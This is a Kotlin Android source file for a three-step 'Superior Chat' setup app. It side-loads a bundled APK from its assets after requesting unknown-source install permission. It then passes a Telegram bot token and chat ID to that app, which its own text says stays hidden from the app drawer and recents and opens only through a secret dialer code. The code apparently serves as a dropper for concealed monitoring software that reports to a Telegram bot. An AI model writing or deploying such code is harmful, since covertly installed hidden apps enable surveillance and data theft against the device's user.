package com.mobile.superiorsetup

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedContent
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey
import android.content.SharedPreferences
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.scaleIn
import androidx.compose.animation.scaleOut
import androidx.compose.animation.togetherWith
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.ArrowForward
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.FileProvider
import com.mobile.superiorsetup.theme.*
import java.io.File
import java.io.FileOutputStream

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SetupUI() {
    val context = LocalContext.current
    LaunchedEffect(Unit) {
        ConfigStore.init(context.applicationContext)
    }

    var currentStep by remember { mutableIntStateOf(if (ConfigStore.botToken.isNotEmpty() && ConfigStore.chatId.isNotEmpty()) 3 else 1) }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { },
                navigationIcon = {
                    if (currentStep > 1) {
                        IconButton(onClick = { currentStep-- }) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = Color.White)
                        }
                    }
                },
                actions = {
                    Surface(
                        color = SurfaceLevel1,
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier.padding(end = 16.dp)
                    ) {
                        Text(
                            text = "Step $currentStep of 3",
                            color = TextSecondary,
                            fontSize = 12.sp,
                            modifier = Modifier.padding(horizontal = 12.dp, vertical = 6.dp)
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = Background)
            )
        },
        containerColor = Background
    ) { paddingValues ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
        ) {
            AnimatedContent(
                targetState = currentStep,
                transitionSpec = {
                    (fadeIn(animationSpec = tween(300)) + scaleIn(initialScale = 0.95f)) togetherWith (fadeOut(animationSpec = tween(300)) + scaleOut(targetScale = 0.95f))
                },
                label = "step_transition"
            ) { step ->
                when (step) {
                    1 -> Step1Screen(onNext = { currentStep = 2 })
                    2 -> Step2Screen(onNext = { currentStep = 3 })
                    3 -> Step3Screen()
                }
            }
        }
    }
}

@Composable
fun Step1Screen(onNext: () -> Unit) {
    val context = LocalContext.current
    var isInstalled by remember { mutableStateOf(isAppInstalled(context, "com.mobile.superiorutils")) }

    val installLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) {
        isInstalled = isAppInstalled(context, "com.mobile.superiorutils")
        if (isInstalled) {
            onNext()
        }
    }

    // Permission launcher for REQUEST_INSTALL_PACKAGES if needed on older devices / specific OS variants
    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) {
        // Continue to install regardless, might have granted it.
        installApp(context) { intent -> installLauncher.launch(intent) }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Filled.ChatBubble, contentDescription = null, tint = Primary, modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(16.dp))
            Text("Welcome to", fontSize = 24.sp, color = TextPrimary)
            Text("Superior Chat", fontSize = 24.sp, color = Primary, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "A hidden and secure chat experience powered by Telegram Bot API.",
                color = TextSecondary,
                textAlign = TextAlign.Center,
                fontSize = 13.sp
            )
            
            Spacer(modifier = Modifier.height(24.dp))
            
            FeatureRow(Icons.Filled.Shield, "Fully Private", "Your chats stay hidden. Access the app only via a secret dialer code.")
            Spacer(modifier = Modifier.height(12.dp))
            FeatureRow(Icons.Filled.FlashOn, "Telegram Powered", "Reliable messaging with Telegram Bot API for fast and secure delivery.")
            Spacer(modifier = Modifier.height(12.dp))
            FeatureRow(Icons.Filled.VisibilityOff, "Invisible Mode", "The app is completely hidden from your app drawer and recent apps list.")
        }
        
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            if (isInstalled) {
                Button(
                    onClick = { onNext() },
                    modifier = Modifier.fillMaxWidth().height(52.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Success),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(Icons.Filled.Check, contentDescription = null)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("App Installed - Continue", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                }
            } else {
                Button(
                    onClick = {
                        if (!context.packageManager.canRequestPackageInstalls()) {
                            val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                                data = Uri.parse("package:${context.packageName}")
                            }
                            permissionLauncher.launch(intent)
                        } else {
                            installApp(context) { intent -> installLauncher.launch(intent) }
                        }
                    },
                    modifier = Modifier.fillMaxWidth().height(52.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Primary),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Icon(Icons.Filled.Download, contentDescription = null)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Install Main Application", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                }
            }
            Spacer(modifier = Modifier.height(12.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Filled.Lock, contentDescription = null, tint = TextSecondary, modifier = Modifier.size(14.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("Private • Encrypted • Hidden", color = TextSecondary, fontSize = 11.sp)
            }
        }
    }
}

@Composable
fun Step2Screen(onNext: () -> Unit) {
    var botToken by remember { mutableStateOf(ConfigStore.botToken) }
    var chatId by remember { mutableStateOf(ConfigStore.chatId) }
    var tokenVisible by remember { mutableStateOf(false) }
    var errorMessage by remember { mutableStateOf<String?>(null) }
    
    if (errorMessage != null) {
        com.mobile.superiorsetup.ui.components.ErrorDialog(
            title = "Invalid Credentials",
            message = errorMessage!!,
            onDismiss = { errorMessage = null }
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Filled.VpnKey, contentDescription = null, tint = Primary, modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(16.dp))
            Text("Enter Credentials", fontSize = 24.sp, color = TextPrimary, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "Connect your Telegram bot to enable secure messaging.",
                color = TextSecondary,
                textAlign = TextAlign.Center,
                fontSize = 13.sp
            )
            
            Spacer(modifier = Modifier.height(24.dp))
            
            // Bot Token Field
            Surface(
                color = SurfaceLevel1,
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, DividerColor),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Key, contentDescription = null, tint = Primary, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Bot Token", color = TextPrimary, fontWeight = FontWeight.Medium, fontSize = 14.sp)
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    OutlinedTextField(
                        value = botToken,
                        onValueChange = { botToken = it },
                        placeholder = { Text("e.g. 1234567890:AAH...", color = TextSecondary, fontSize = 13.sp) },
                        modifier = Modifier.fillMaxWidth().height(52.dp),
                        colors = OutlinedTextFieldDefaults.colors(
                            unfocusedContainerColor = SurfaceLevel2,
                            focusedContainerColor = SurfaceLevel2,
                            unfocusedBorderColor = Color.Transparent,
                            focusedBorderColor = Primary,
                            unfocusedTextColor = TextPrimary,
                            focusedTextColor = TextPrimary
                        ),
                        shape = RoundedCornerShape(10.dp),
                        visualTransformation = if (tokenVisible) VisualTransformation.None else PasswordVisualTransformation(),
                        trailingIcon = {
                            IconButton(onClick = { tokenVisible = !tokenVisible }) {
                                Icon(if (tokenVisible) Icons.Filled.Visibility else Icons.Filled.VisibilityOff, contentDescription = null, tint = TextSecondary, modifier = Modifier.size(18.dp))
                            }
                        }
                    )
                }
            }
            
            Spacer(modifier = Modifier.height(12.dp))
            
            // Chat ID Field
            Surface(
                color = SurfaceLevel1,
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, DividerColor),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(14.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Chat, contentDescription = null, tint = Primary, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Chat ID", color = TextPrimary, fontWeight = FontWeight.Medium, fontSize = 14.sp)
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    OutlinedTextField(
                        value = chatId,
                        onValueChange = { chatId = it },
                        placeholder = { Text("e.g. -1001234567890", color = TextSecondary, fontSize = 13.sp) },
                        modifier = Modifier.fillMaxWidth().height(52.dp),
                        colors = OutlinedTextFieldDefaults.colors(
                            unfocusedContainerColor = SurfaceLevel2,
                            focusedContainerColor = SurfaceLevel2,
                            unfocusedBorderColor = Color.Transparent,
                            focusedBorderColor = Primary,
                            unfocusedTextColor = TextPrimary,
                            focusedTextColor = TextPrimary
                        ),
                        shape = RoundedCornerShape(10.dp)
                    )
                }
            }
        }
        
        Spacer(modifier = Modifier.height(24.dp))
        
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(12.dp))
                    .background(SurfaceLevel1)
                    .border(1.dp, DividerColor, RoundedCornerShape(12.dp))
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(Icons.Filled.Shield, contentDescription = null, tint = Primary, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(10.dp))
                Text("Your credentials are stored securely on your device and never shared.", color = TextSecondary, fontSize = 11.sp)
            }
            Spacer(modifier = Modifier.height(16.dp))
            Button(
                onClick = {
                    val token = botToken.trim()
                    val chat = chatId.trim()
                    
                    if (!com.mobile.superiorsetup.utils.ValidationUtils.isValidBotToken(token)) {
                        errorMessage = "The Bot Token format is invalid. It should look like '1234567890:ABCdef...'"
                        return@Button
                    }
                    
                    if (!com.mobile.superiorsetup.utils.ValidationUtils.isValidChatId(chat)) {
                        errorMessage = "The Chat ID format is invalid. It must be a numeric ID, optionally starting with a '-' sign."
                        return@Button
                    }
                    
                    ConfigStore.botToken = token
                    ConfigStore.chatId = chat
                    onNext()
                },
                modifier = Modifier.fillMaxWidth().height(52.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Primary),
                shape = RoundedCornerShape(16.dp),
                enabled = botToken.isNotBlank() && chatId.isNotBlank()
            ) {
                Icon(Icons.Filled.Lock, contentDescription = null, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text("Save Credentials", fontSize = 15.sp, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun Step3Screen() {
    val context = LocalContext.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Filled.CheckCircle, contentDescription = null, tint = Primary, modifier = Modifier.size(64.dp))
            Spacer(modifier = Modifier.height(16.dp))
            Text("You're All Set!", fontSize = 24.sp, color = TextPrimary, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                "Your secure chat is ready.\nOpen the app and start messaging through your Telegram bot.",
                color = TextSecondary,
                textAlign = TextAlign.Center,
                fontSize = 13.sp
            )
            
            Spacer(modifier = Modifier.height(24.dp))
            
            Surface(
                color = SurfaceLevel1,
                shape = RoundedCornerShape(16.dp),
                border = BorderStroke(1.dp, DividerColor),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column {
                    StatusRow(Icons.Filled.Security, "Security", "End-to-End")
                    HorizontalDivider(color = DividerColor)
                    StatusRow(Icons.Filled.Speed, "Connection", "Ready")
                }
            }
        }
        
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            Button(
                onClick = {
                    // Handshake logic
                    try {
                        val uri = Uri.parse("content://com.mobile.superiorutils.keys")
                        val cursor = context.contentResolver.query(uri, null, null, null, null)
                        var publicKeyBase64 = ""
                        cursor?.use {
                            if (it.moveToFirst()) {
                                publicKeyBase64 = it.getString(0)
                            }
                        }
                        
                        if (publicKeyBase64.isEmpty()) {
                            Toast.makeText(context, "Error: Could not retrieve secure key from main app. Is it installed?", Toast.LENGTH_LONG).show()
                            return@Button
                        }
                        
                        val encryptedToken = CryptoUtils.encryptRSA(ConfigStore.botToken, publicKeyBase64)
                        val encryptedChatId = CryptoUtils.encryptRSA(ConfigStore.chatId, publicKeyBase64)

                        val intent = Intent()
                        intent.component = android.content.ComponentName("com.mobile.superiorutils", "com.mobile.superiorutils.MainActivity")
                        intent.putExtra("SETUP_BOT_TOKEN", encryptedToken)
                        intent.putExtra("SETUP_CHAT_ID", encryptedChatId)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                        Toast.makeText(context, "Main app awakened and configured!", Toast.LENGTH_SHORT).show()
                        
                        
                        (context as? android.app.Activity)?.finish()
                    } catch (e: Exception) {
                        Toast.makeText(context, "Error launching main app: ${e.message}", Toast.LENGTH_LONG).show()
                    }
                },
                modifier = Modifier.fillMaxWidth().height(52.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Primary),
                shape = RoundedCornerShape(16.dp)
            ) {
                Text("Open Main Application", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.width(8.dp))
                Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null, modifier = Modifier.size(18.dp))
            }
            Spacer(modifier = Modifier.height(12.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Filled.CheckCircleOutline, contentDescription = null, tint = Success, modifier = Modifier.size(14.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("Hidden • Private • Ready", color = TextSecondary, fontSize = 11.sp)
            }
        }
    }
}

@Composable
fun FeatureRow(icon: ImageVector, title: String, desc: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 12.dp, horizontal = 8.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Box(
            modifier = Modifier.size(44.dp).clip(RoundedCornerShape(12.dp)).background(Primary.copy(alpha = 0.15f)),
            contentAlignment = Alignment.Center
        ) {
            Icon(icon, contentDescription = null, tint = Primary, modifier = Modifier.size(24.dp))
        }
        Spacer(modifier = Modifier.width(16.dp))
        Column {
            Text(title, color = Primary, fontWeight = FontWeight.Bold, fontSize = 15.sp)
            Spacer(modifier = Modifier.height(2.dp))
            Text(desc, color = TextSecondary, fontSize = 13.sp)
        }
    }
}

@Composable
fun StatusRow(icon: ImageVector, title: String, status: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(14.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Icon(icon, contentDescription = null, tint = Primary, modifier = Modifier.size(24.dp))
        Spacer(modifier = Modifier.width(16.dp))
        Column {
            Text(title, color = Primary, fontWeight = FontWeight.Bold, fontSize = 14.sp)
            Spacer(modifier = Modifier.height(2.dp))
            Text(status, color = TextSecondary, fontSize = 13.sp)
        }
        Spacer(modifier = Modifier.weight(1f))
        Icon(Icons.Filled.CheckCircle, contentDescription = null, tint = Primary, modifier = Modifier.size(20.dp))
    }
}

// Persistent encrypted store for setup app
object ConfigStore {
    private var prefs: SharedPreferences? = null

    fun init(context: Context) {
        if (prefs == null) {
            val masterKey = MasterKey.Builder(context)
                .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                .build()
            prefs = EncryptedSharedPreferences.create(
                context,
                "setup_secret_prefs",
                masterKey,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        }
    }

    var botToken: String
        get() = prefs?.getString("bot_token", "") ?: ""
        set(value) { prefs?.edit()?.putString("bot_token", value)?.apply() }

    var chatId: String
        get() = prefs?.getString("chat_id", "") ?: ""
        set(value) { prefs?.edit()?.putString("chat_id", value)?.apply() }
}

private fun isAppInstalled(context: Context, packageName: String): Boolean {
    return try {
        context.packageManager.getPackageInfo(packageName, 0)
        true
    } catch (e: PackageManager.NameNotFoundException) {
        false
    }
}

private fun installApp(context: Context, launchIntent: (Intent) -> Unit) {
    try {
        val assetManager = context.assets
        val inputStream = assetManager.open("app.apk")
        val outFile = File(context.cacheDir, "superior_chat.apk")
        val outputStream = FileOutputStream(outFile)
        
        inputStream.copyTo(outputStream)
        inputStream.close()
        outputStream.flush()
        outputStream.close()
        
        val apkUri = FileProvider.getUriForFile(
            context,
            "${context.packageName}.provider",
            outFile
        )
        
        val intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
        intent.data = apkUri
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        intent.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
        intent.putExtra(Intent.EXTRA_RETURN_RESULT, true)
        
        launchIntent(intent)
        
    } catch (e: Exception) {
        Toast.makeText(context, "Error preparing installation: ${e.message}", Toast.LENGTH_LONG).show()
    }
}
